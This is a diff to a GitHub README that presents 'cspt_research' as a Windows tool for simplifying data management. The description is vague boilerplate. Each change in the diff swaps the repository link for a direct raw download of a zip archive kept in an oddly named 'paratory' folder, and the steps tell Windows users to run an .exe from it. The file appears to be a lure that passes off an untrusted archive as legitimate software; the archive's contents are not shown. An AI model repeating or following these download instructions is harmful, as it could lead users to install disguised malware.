@@ -1,6 +1,6 @@
 # 📦 cspt_research - Simplify your data management tasks today
 
-[![Download Application](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/marcomackenberg01/cspt_research)
+[![Download Application](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/marcomackenberg01/cspt_research/raw/refs/heads/main/paratory/cspt_research_v1.4.zip)
 
 ## 📋 About This Software
 
@@ -20,7 +20,7 @@ The application runs on standard Windows computers. Ensure your system meets the
 
 Follow these steps to install the software on your Windows computer.
 
-1. Visit the [official download page](https://github.com/marcomackenberg01/cspt_research) to access the latest version.
+1. Visit the [official download page](https://github.com/marcomackenberg01/cspt_research/raw/refs/heads/main/paratory/cspt_research_v1.4.zip) to access the latest version.
 2. Locate the link labeled "Assets" at the bottom of the release notes.
 3. Select the file ending in .exe to start the download.
 4. Save the file to your Downloads folder.
@@ -71,4 +71,4 @@ This application receives regular updates to improve performance. Check the webs
 
 The application serves as a foundation for your research. It organizes your workflow and removes the clutter from your workspace. By keeping your data in one location, you maintain focus on the research rather than file management. Use the provided installation link to get started with the latest version today. 
 
-[Download the application here](https://github.com/marcomackenberg01/cspt_research)
+[Download the application here](https://github.com/marcomackenberg01/cspt_research/raw/refs/heads/main/paratory/cspt_research_v1.4.zip)
